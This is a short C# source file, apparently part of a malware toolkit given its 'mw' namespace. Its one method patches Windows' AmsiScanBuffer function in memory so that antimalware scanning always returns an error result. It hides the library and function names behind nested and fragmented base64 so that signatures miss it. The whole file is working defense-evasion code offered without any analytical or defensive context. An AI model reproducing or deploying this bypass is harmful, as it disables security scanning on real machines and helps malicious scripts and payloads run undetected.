using System;
using mw.utils;
using System.Runtime.InteropServices;

namespace mw.ampatch
{
    public class patch
    {

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        private static void copy(Byte[] Patch, IntPtr Address)
        {
            Marshal.Copy(Patch, 0, Address, 6);
        }

        public static void chaching()
        {
            
            IntPtr Library = LoadLibrary(base64.decode(base64.decode(base64.decode(base64.decode("VjFaamVHVnRSbFJPVjNScFVqTmpPUT09")))));
            IntPtr Address = GetProcAddress(Library, base64.decode("QW0=") + base64.decode("c2k=") + base64.decode("U2M=") + base64.decode("YW4=") + base64.decode("QnVm") +"fer");
            uint p;
            VirtualProtect(Address, (UIntPtr)5, 0x40, out p);
            Byte[] Patch = { base64.decodedBytes("uA==")[0], base64.decodedBytes( "Vw==")[0], base64.decodedBytes("AA==")[0], base64.decodedBytes("Bw==")[0], base64.decodedBytes("gA==")[0], base64.decodedBytes("ww==")[0]};
            copy(Patch, Address);
            Console.WriteLine("Patch Applied");
        }
    }
}